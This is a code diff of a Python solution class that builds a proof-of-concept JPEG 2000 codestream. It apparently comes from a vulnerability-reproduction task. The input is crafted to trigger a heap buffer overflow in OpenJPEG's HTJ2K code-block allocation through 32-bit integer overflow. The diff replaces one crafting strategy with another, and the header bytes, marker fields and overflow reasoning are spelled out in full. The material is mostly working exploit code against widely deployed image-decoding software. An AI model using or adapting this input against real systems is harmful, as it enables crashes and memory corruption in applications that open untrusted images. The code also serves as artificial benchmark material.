@@ -5,90 +5,92 @@ class Solution:
         """
         Generate a PoC that triggers the vulnerability.
 
-        The vulnerability is a malloc size error in the opj_t1_allocate_buffers
-        function of the HT_DEC component. This is caused by an integer overflow
-        when calculating the buffer size for tile data. The size is calculated
-        as `width * height * sizeof(some_type)`.
+        The vulnerability is a heap buffer overflow in opj_t1_allocate_buffers
+        when handling HTJ2K (High Throughput JPEG 2000) codestreams. The overflow
+        is caused by an integer multiplication overflow when calculating the
+        buffer size, which is based on code-block dimensions (width * height).
 
-        In HTJ2K (High Throughput JPEG 2000) mode, the dimensions of the first
-        precinct are derived from the tile dimensions. By crafting a JPEG 2000
-        codestream (J2K) with specific tile dimensions, we can cause the
-        multiplication to overflow a 32-bit integer. This results in `malloc`
-        allocating a much smaller buffer than required. Subsequent memory accesses
-        that assume the correct large buffer size will then lead to a heap
-        buffer overflow.
-
-        We choose tile dimensions such that their product exceeds 2^32:
-        - Tile width (w): 131072 (0x20000)
-        - Tile height (h): 32769  (0x8001)
-        - Product (w * h): 4295098368 (0x100020000)
-
-        In 32-bit unsigned arithmetic, this product wraps around to 0x20000.
-        The PoC is a minimal J2K file containing the necessary headers to
-        specify these malicious dimensions and enable the vulnerable HTJ2K
-        decoding path. The crash occurs early during tile decoding setup,
-        so no actual image data is needed.
-
-        Args:
-            src_path: Path to the vulnerable source code tarball (unused).
-
-        Returns:
-            bytes: The PoC input that should trigger the vulnerability.
+        To trigger this, we construct a J2K codestream with specific parameters:
+        1.  Enable JPEG 2000 Part 2 parsing mode by setting Rsiz=33 in the SIZ
+            marker. This is crucial because only in this mode does OpenJPEG read
+            the 2-byte cblksty field, allowing us to set the HT flag (0x0200).
+        2.  Set a large number of decomposition levels (num_dlvls=33) in the COD
+            marker. This, combined with large image dimensions, causes internal
+            coordinate calculations to overflow 32-bit integers.
+        3.  Specify very large image and tile dimensions (e.g., 0x10001) in the
+            SIZ marker. Due to the aforementioned coordinate overflow, the clipping
+            logic fails, resulting in a code-block with dimensions like 65537x65537.
+        4.  Enable the High Throughput (HT) mode by setting the cblksty flag to
+            0x0200 in the COD marker. This directs the decoder to the vulnerable
+            HT_DEC component path.
+        5.  The product of the resulting code-block dimensions (65537 * 65537)
+            overflows a 32-bit integer, leading to a small allocation size.
+            Subsequent writes to this undersized buffer cause a heap overflow.
         """
-        width = 131072
-        height = 32769
-
         poc = b''
 
-        # SOC: Start of Codestream marker
+        # SOC Marker: Start of Codestream
         poc += b'\xff\x4f'
 
-        # SIZ: Image and Tile Size marker
-        poc += b'\xff\x51'
-        poc += b'\x00\x28'  # Lsiz (marker length) = 40
-        poc += b'\x00\x00'  # Rsiz (capabilities)
-        poc += struct.pack('>I', width)   # Xsiz (image width)
-        poc += struct.pack('>I', height)  # Ysiz (image height)
-        poc += b'\x00\x00\x00\x00' * 2  # XOsiz, YOsiz (image offset)
-        poc += struct.pack('>I', width)   # XTsiz (tile width)
-        poc += struct.pack('>I', height)  # YTsiz (tile height)
-        poc += b'\x00\x00\x00\x00' * 2  # XTOsiz, YTOsiz (tile offset)
-        poc += b'\x00\x01'  # Csiz (number of components)
-        poc += b'\x07\x01\x01'  # Ssiz, XRsiz, YRsiz for component 0 (8-bit, no subsampling)
+        # SIZ Marker: Image and Tile Size
+        siz_data = struct.pack(
+            '>HIIIIIIIIHBBB',
+            33,              # Rsiz: Enable JPEG 2000 Part 2 Profile (key to read 2-byte cblksty)
+            0x10001,         # Xsiz: Image width
+            0x10001,         # Ysiz: Image height
+            0,               # XOsiz: Horizontal image offset
+            0,               # YOsiz: Vertical image offset
+            0x10001,         # XTsiz: Tile width
+            0x10001,         # YTsiz: Tile height
+            0,               # XTOsiz: Horizontal tile offset
+            0,               # YTOsiz: Vertical tile offset
+            1,               # Csiz: Number of components
+            7,               # Ssiz_0: 8-bit unsigned
+            1,               # XRsiz_0: Horizontal subsampling
+            1                # YRsiz_0: Vertical subsampling
+        )
+        poc += b'\xff\x51' + struct.pack('>H', len(siz_data) + 2) + siz_data
 
-        # COD: Coding Style Default marker (to enable HTJ2K)
-        poc += b'\xff\x52'
-        poc += b'\x00\x0d'  # Lcod (marker length) = 13
-        poc += b'\x80'      # Scod (HTJ2K enabled)
-        poc += b'\x00'      # Progression order
-        poc += b'\x00\x01'  # Number of layers
-        poc += b'\x00'      # Multiple component transform
-        poc += b'\x01'      # Number of decomposition levels
-        poc += b'\x02'      # Code-block width exponent
-        poc += b'\x02'      # Code-block height exponent
-        poc += b'\x00'      # Code-block style
-        poc += b'\x00'      # Transformation (9-7 irreversible)
-        poc += b'\x00'      # Cmodes (HT modes)
+        # COD Marker: Coding Style Default
+        num_dlvls = 33
+        num_precincts = num_dlvls + 1
+        
+        scod = b'\x01'  # Scod: Precinct sizes are specified
+        
+        sgcod = struct.pack('>BHB', 0, 1, 0) # SGcod: Prog order, layers, MCT
 
-        # QCD: Quantization Default marker
-        poc += b'\xff\x5c'
-        poc += b'\x00\x03'  # Lqcd (marker length) = 3
-        poc += b'\x00'      # Sqcd (no quantization)
+        spcod_hdr = struct.pack(
+            '>BBBHB',
+            num_dlvls,       # SPcod: Number of decomposition levels
+            8,               # Code-block width exponent (1024)
+            8,               # Code-block height exponent (1024)
+            0x0200,          # Code-block style: HT flag enabled
+            1                # Wavelet transform: 5/3 reversible
+        )
+        
+        precincts = bytes([0xff] * num_precincts) # Precinct sizes: Max for all levels
+        
+        cod_data = scod + sgcod + spcod_hdr + precincts
+        poc += b'\xff\x52' + struct.pack('>H', len(cod_data) + 2) + cod_data
 
-        # SOT: Start of Tile-part marker
-        poc += b'\xff\x90'
-        poc += b'\x00\x0a'  # Lsot (marker length) = 10
-        poc += b'\x00\x00'  # Isot (tile index)
-        # Psot = 0: tile-part extends to the EOC marker. This is sufficient
-        # as the crash happens before actual data processing.
-        poc += b'\x00\x00\x00\x00'  # Psot (tile-part length)
-        poc += b'\x00'      # TPsot (tile-part index)
-        poc += b'\x01'      # TNsot (number of tile-parts)
+        # QCD Marker: Quantization Default
+        num_bands = 1 + 3 * num_dlvls
+        qcd_data = struct.pack('>B', 0x01) + bytes([0x00] * num_bands)
+        poc += b'\xff\x5c' + struct.pack('>H', len(qcd_data) + 2) + qcd_data
 
-        # SOD: Start of Data marker
+        # SOT Marker: Start of Tile
+        sot_data = struct.pack('>HIBB',
+            0,               # Isot: Tile index
+            0,               # Psot: Tile-part length (0 = until EOC)
+            0,               # TPsot: Tile-part index
+            1                # TNsot: Number of tile-parts
+        )
+        poc += b'\xff\x90' + struct.pack('>H', 10) + sot_data
+
+        # SOD Marker: Start of Data
         poc += b'\xff\x93'
 
-        # EOC: End of Codestream marker
+        # EOC Marker: End of Codestream
         poc += b'\xff\xd9'
 
         return poc
